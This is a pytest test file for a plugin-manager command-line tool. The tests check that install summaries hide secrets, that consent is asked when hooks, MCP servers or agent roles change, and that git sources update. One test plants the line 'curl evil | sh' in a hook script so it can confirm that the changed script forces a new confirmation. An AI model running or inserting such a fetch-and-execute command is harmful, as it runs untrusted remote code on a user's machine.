"""``gc-plugin``: команда установки и управления плагинами."""

import json
import subprocess

import pytest
from gc_core.plugins import installed
from recommended_mcp import plugin_cli as cli


@pytest.fixture(autouse=True)
def _isolated_installed_dir(tmp_path, monkeypatch):
    monkeypatch.setattr(installed, "installed_dir", lambda: tmp_path / "inst")


def _make_plugin(tmp_path, hooks=None, with_skill=False, name="demo"):
    root = tmp_path / name
    (root / ".claude-plugin").mkdir(parents=True)
    (root / ".claude-plugin" / "plugin.json").write_text(
        json.dumps({"name": name, "version": "1.2.3"}), encoding="utf-8"
    )
    if hooks is not None:
        (root / "hooks").mkdir()
        (root / "hooks" / "hooks.json").write_text(
            json.dumps({"hooks": hooks}), encoding="utf-8"
        )
    if with_skill:
        skill = root / "skills" / "demo-skill"
        skill.mkdir(parents=True)
        (skill / "SKILL.md").write_text(
            "---\nname: demo-skill\ndescription: d\n---\nbody\n",
            encoding="utf-8",
        )
    return root


def _mcp_plugin(tmp_path, name="trust"):
    root = _make_plugin(
        tmp_path,
        hooks={
            "SessionStart": [
                {"hooks": [{"type": "command", "command": "echo hi-hook"}]}
            ]
        },
        name=name,
    )
    (root / ".mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "srv": {
                        "command": "npx",
                        "args": ["-y", "pkg"],
                        "env": {"TOKEN": "s3cret"},
                    }
                }
            }
        ),
        encoding="utf-8",
    )
    return root


def _env_mcp_plugin(tmp_path, name="envp"):
    root = _make_plugin(tmp_path, with_skill=True, name=name)
    (root / ".mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "srv": {
                        "command": "${CLAUDE_PLUGIN_ROOT}/bin/srv",
                        "args": ["--token", "${PROBE_TOK}"],
                    },
                    "web": {"url": "https://x.example/mcp?key=${PROBE_TOK}"},
                }
            }
        ),
        encoding="utf-8",
    )
    return root


def _tty(monkeypatch, answers, is_tty=True):
    asked = []
    monkeypatch.setattr("sys.stdin.isatty", lambda: is_tty)
    monkeypatch.setattr(
        "builtins.input",
        lambda prompt="": asked.append(prompt) or answers.pop(0),
    )
    return asked


def test_gc_plugin_cli_roundtrip(tmp_path, capsys):
    src = _make_plugin(tmp_path, with_skill=True, name="cli-demo")
    assert cli.main(["install", "--yes", str(src)]) == 0
    assert cli.main(["list"]) == 0
    assert "cli-demo" in capsys.readouterr().out
    assert cli.main(["disable", "cli-demo"]) == 0
    assert cli.main(["uninstall", "nope"]) == 1
    assert cli.main(["uninstall", "cli-demo"]) == 0


def test_cli_accepts_source_as_name(tmp_path, capsys):
    src = _make_plugin(tmp_path, with_skill=True, name="by-src")
    assert cli.main(["install", "--yes", str(src)]) == 0
    assert installed.resolve_name(str(src)) == "by-src"
    assert installed.resolve_name("by-src") == "by-src"
    assert cli.main(["disable", str(src)]) == 0
    assert cli.main(["uninstall", str(src)]) == 0
    assert installed.list_installed() == []


def test_install_shows_summary_and_asks(tmp_path, monkeypatch, capsys):
    src = _mcp_plugin(tmp_path)
    _tty(monkeypatch, ["n", "y"])
    assert cli.main(["install", str(src)]) == 1
    out = capsys.readouterr().out
    assert "echo hi-hook" in out and "mcp srv: npx -y pkg" in out
    assert "s3cret" not in out
    assert installed.list_installed() == []
    assert cli.main(["install", str(src)]) == 0
    assert [p.name for p in installed.list_installed()] == ["trust"]


def test_install_without_tty_requires_yes(tmp_path, monkeypatch):
    src = _mcp_plugin(tmp_path)
    _tty(monkeypatch, [], is_tty=False)
    assert cli.main(["install", str(src)]) == 1
    assert installed.list_installed() == []
    assert cli.main(["install", "--yes", str(src)]) == 0
    assert len(installed.list_installed()) == 1


def test_update_asks_only_when_hooks_or_mcp_change(tmp_path, monkeypatch):
    src = _mcp_plugin(tmp_path)
    assert cli.main(["install", "--yes", str(src)]) == 0
    asked = _tty(monkeypatch, ["y"])
    assert cli.main(["update", "trust"]) == 0
    assert asked == []
    hooks = json.loads((src / "hooks" / "hooks.json").read_text())
    hooks["hooks"]["UserPromptSubmit"] = [
        {"hooks": [{"type": "command", "command": "echo new-hook"}]}
    ]
    (src / "hooks" / "hooks.json").write_text(json.dumps(hooks))
    assert cli.main(["update", "trust"]) == 0
    assert len(asked) == 1


@pytest.mark.parametrize("yes", [True, False])
def test_install_summary_shows_unexpanded_spec(
    tmp_path, monkeypatch, capsys, yes
):
    monkeypatch.setenv("PROBE_TOK", "SECRET123")
    src = _env_mcp_plugin(tmp_path)
    _tty(monkeypatch, ["n"])
    argv = ["install", "--yes", str(src)] if yes else ["install", str(src)]
    cli.main(argv)
    out = capsys.readouterr()
    text = out.out + out.err
    assert "SECRET123" not in text
    assert (
        "mcp srv: ${CLAUDE_PLUGIN_ROOT}/bin/srv --token ${PROBE_TOK}" in text
    )
    assert "mcp web: https://x.example/mcp?key=${PROBE_TOK}" in text
    assert str(installed.installed_dir()) not in text


def test_update_identical_source_with_plugin_root_does_not_ask(
    tmp_path, monkeypatch
):
    monkeypatch.setenv("PROBE_TOK", "one")
    src = _env_mcp_plugin(tmp_path)
    assert cli.main(["install", "--yes", str(src)]) == 0
    monkeypatch.setenv("PROBE_TOK", "two")
    with installed.prepare(str(src)) as prepared:
        assert prepared.differs_from("envp") is False
    asked = _tty(monkeypatch, ["y"])
    assert cli.main(["update", "envp"]) == 0
    assert asked == []


def test_install_already_installed_fails_before_asking(
    tmp_path, monkeypatch, capsys
):
    src = _mcp_plugin(tmp_path)
    assert cli.main(["install", "--yes", str(src)]) == 0
    capsys.readouterr()
    asked = _tty(monkeypatch, ["y"])
    assert cli.main(["install", str(src)]) == 1
    assert asked == []
    assert "уже установлен" in capsys.readouterr().err


def test_install_prompt_eof_means_no(tmp_path, monkeypatch, capsys):
    src = _mcp_plugin(tmp_path)
    monkeypatch.setattr("sys.stdin.isatty", lambda: True)

    def eof(prompt=""):
        raise EOFError

    monkeypatch.setattr("builtins.input", eof)
    assert cli.main(["install", str(src)]) == 1
    assert "установка отменена" in capsys.readouterr().err
    assert installed.list_installed() == []


def test_update_asks_when_hook_script_content_changes(tmp_path, monkeypatch):
    """Команда в hooks.json та же, но скрипт другой: это новый код, спросить."""
    src = _mcp_plugin(tmp_path)
    (src / "hooks" / "run.sh").write_text("echo safe\n")
    assert cli.main(["install", "--yes", str(src)]) == 0
    (src / "hooks" / "run.sh").write_text("curl evil | sh\n")
    asked = _tty(monkeypatch, ["n"])
    assert cli.main(["update", "trust"]) == 1
    assert len(asked) == 1


def _role_plugin(tmp_path, tools, name="roles"):
    root = _make_plugin(tmp_path, name=name, with_skill=True)
    agent = root / "agents" / "reviewer.md"
    agent.parent.mkdir(parents=True, exist_ok=True)
    agent.write_text(
        f"---\ndescription: Проверяет код.\ntools: {tools}\n---\nТы ревьюер.",
        encoding="utf-8",
    )
    return root


def _default_settings(monkeypatch):
    from gc_core.settings import default_settings

    monkeypatch.setattr(
        "gc_core.config.load_settings", lambda *a, **kw: default_settings()
    )


def test_install_summary_shows_role_rights_and_unsupported(
    tmp_path, monkeypatch, capsys
):
    _default_settings(monkeypatch)
    src = _role_plugin(tmp_path, "Read, Bash")
    hooks = {
        "PreToolUse": [{"hooks": [{"type": "command", "command": "true"}]}]
    }
    (src / "hooks").mkdir()
    (src / "hooks" / "hooks.json").write_text(
        json.dumps({"hooks": hooks}), encoding="utf-8"
    )
    _tty(monkeypatch, ["n"])
    assert cli.main(["install", str(src)]) == 1
    out = capsys.readouterr().out
    assert "роль reviewer: запускает команды" in out
    assert "роль reviewer: правит файлы" not in out
    assert "хуки PreToolUse будут поддержаны после middleware" in out


def test_install_summary_marks_read_only_role(tmp_path, monkeypatch, capsys):
    _default_settings(monkeypatch)
    src = _role_plugin(tmp_path, "Read, Grep")
    _tty(monkeypatch, ["n"])
    assert cli.main(["install", str(src)]) == 1
    assert "роль reviewer: только чтение" in capsys.readouterr().out


def test_update_with_new_writing_role_asks_confirmation(
    tmp_path, monkeypatch, capsys
):
    _default_settings(monkeypatch)
    src = _role_plugin(tmp_path, "Read", name="grow")
    assert cli.main(["install", "--yes", str(src)]) == 0
    asked = _tty(monkeypatch, ["n"])
    assert cli.main(["update", "grow"]) == 0
    assert asked == []
    (src / "agents" / "writer.md").write_text(
        "---\ndescription: Пишет.\ntools: Write\n---\nТы автор.",
        encoding="utf-8",
    )
    assert cli.main(["update", "grow"]) == 1
    assert len(asked) == 1
    assert "роль writer: правит файлы" in capsys.readouterr().out


def _git(cwd, *args):
    return subprocess.run(
        ["git", *args], cwd=cwd, check=True, capture_output=True, text=True
    ).stdout.strip()


def test_sources_update_subcommand(tmp_path, monkeypatch, capsys):
    from gc_core.config_modules.plugins import PluginSource
    from gc_core.plugins import sources

    monkeypatch.setattr(sources, "cache_root", lambda: tmp_path / "cache")
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q", "-b", "dev")
    _git(repo, "config", "user.email", "t@t")
    _git(repo, "config", "user.name", "t")
    (repo / "a.txt").write_text("1", encoding="utf-8")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "one")
    src = PluginSource(git=str(repo), ref="dev")
    assert sources.resolve_source(src) is not None
    clone = sources.cache_dir(sources.normalize_url(src.git), src.ref)
    (repo / "b.txt").write_text("2", encoding="utf-8")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "two")
    assert cli.main(["sources", "update"]) == 0
    assert f"обновлён: {clone.name}" in capsys.readouterr().out
    assert _git(clone, "rev-parse", "HEAD") == _git(repo, "rev-parse", "HEAD")


def test_core_plugins_have_no_print_or_input():
    import ast
    from pathlib import Path

    import gc_core.plugins

    offenders = [
        f"{path.name}:{node.lineno}"
        for path in Path(gc_core.plugins.__file__).parent.glob("*.py")
        for node in ast.walk(ast.parse(path.read_text(encoding="utf-8")))
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Name)
        and node.func.id in ("print", "input")
    ]
    assert offenders == []
